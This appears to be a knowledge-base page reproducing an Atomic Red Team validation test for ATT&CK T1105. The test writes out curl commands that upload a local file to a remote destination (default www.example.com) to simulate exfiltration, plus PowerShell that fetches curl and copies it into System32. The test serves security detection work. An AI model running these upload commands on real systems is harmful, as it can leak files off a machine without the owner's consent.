---
atomic_guid: "635c9a38-6cbf-47dc-8615-3810bc1167cf"
title: "Curl Upload File"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-27 19:12:27"
executor: "command_prompt"
aliases:
  - "635c9a38-6cbf-47dc-8615-3810bc1167cf"
  - "Curl Upload File"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration
Expected output will include whether the file uploaded successfully or not.

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

## Input Arguments

### curl_path

- description: path to curl.exe
- type: path
- default: C:\Windows\System32\Curl.exe

### file_path

- description: File to upload
- type: string
- default: c:\temp\atomictestfile.txt

### remote_destination

- description: Remote destination
- type: string
- default: www.example.com

## Dependencies

Curl must be installed on system.

### Prerequisite Check

```powershell
if (Test-Path #{curl_path}) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile PathToAtomicsFolder\..\ExternalPayloads\curl.zip
Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\curl.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\curl"
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\curl\curl-7.79.1-win64-mingw\bin\curl.exe" C:\Windows\System32\Curl.exe
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl"
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
```

A file must be created to upload

### Prerequisite Check

```powershell
if (Test-Path #{file_path}) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
echo "This is an Atomic Test File" > #{file_path}
```

## Executor

- name: command_prompt

### Command

```cmd
#{curl_path} -T #{file_path} #{remote_destination}
#{curl_path} --upload-file #{file_path} #{remote_destination}
#{curl_path} -d #{file_path} #{remote_destination}
#{curl_path} --data #{file_path} #{remote_destination}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
